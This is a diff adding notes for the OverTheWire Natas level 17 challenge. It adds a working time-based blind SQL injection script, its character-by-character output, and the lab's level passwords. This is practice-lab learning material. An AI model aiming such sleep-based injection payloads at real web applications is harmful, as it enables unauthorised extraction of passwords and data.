@@ -452,8 +452,84 @@ print(out)
 
 ## 17->18
 - http://natas17.natas.labs.overthewire.org/
-- `natas18:`
+- `natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJUV`
 - https://learnhacking.io/overthewire-natas-level-17-walkthrough/
 - This one is like 15, except the `echo` statements have been commented out, so we can't "see" anything visually from the FE client. The trick, timing... wow.
+- Takeaway: SQL injection can include timing injection to gain information about a system when visual output is unavailable.
 - 2025-06-19 Break Day
 - 2025-06-20 Break Day
+```python
+import requests
+import string
+from requests.auth import HTTPBasicAuth
+
+basicAuth=HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+u="http://natas17.natas.labs.overthewire.org/index.php?debug"
+
+password="" # start with blank password
+count = 1   # substr() length argument starts at 1
+PASSWORD_LENGTH = 32  # previous passwords were 32 chars long
+VALID_CHARS = string.digits + string.ascii_letters
+
+while count <= PASSWORD_LENGTH + 1: 
+    for c in VALID_CHARS: 
+        payload = (
+            "username=natas18"
+            "\" AND "
+            "IF(BINARY substring(password,1," + str(count) + ")"
+            " = '" + password + c + "', sleep(2), False)"
+            " -- "
+        )
+
+        response = requests.post(u, data=payload, headers=headers, auth=basicAuth, verify=False) 
+
+        # print(payload, " ------ ", response.elapsed) 
+        
+        if (response.elapsed.total_seconds() > 2):
+            print("Found one more char : %s" % (password+c))
+            password += c
+            count = count + 1
+
+print("Done!")
+```
+
+```bash
+➜  natas git:(main) ✗ python natas17.py
+Found one more char : 6
+Found one more char : 6O
+Found one more char : 6OG
+Found one more char : 6OG1
+Found one more char : 6OG1P
+Found one more char : 6OG1Pb
+Found one more char : 6OG1PbK
+Found one more char : 6OG1PbKd
+Found one more char : 6OG1PbKdV
+Found one more char : 6OG1PbKdVj
+Found one more char : 6OG1PbKdVjy
+Found one more char : 6OG1PbKdVjyB
+Found one more char : 6OG1PbKdVjyBl
+Found one more char : 6OG1PbKdVjyBlp
+Found one more char : 6OG1PbKdVjyBlpx
+Found one more char : 6OG1PbKdVjyBlpxg
+Found one more char : 6OG1PbKdVjyBlpxgD
+Found one more char : 6OG1PbKdVjyBlpxgD4
+Found one more char : 6OG1PbKdVjyBlpxgD4D
+Found one more char : 6OG1PbKdVjyBlpxgD4DD
+Found one more char : 6OG1PbKdVjyBlpxgD4DDb
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbR
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG6
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG6Z
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG6ZL
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG6ZLl
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG6ZLlC
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCG
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGg
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgC
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJU
+Found one more char : 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJUV
+Done!
+```
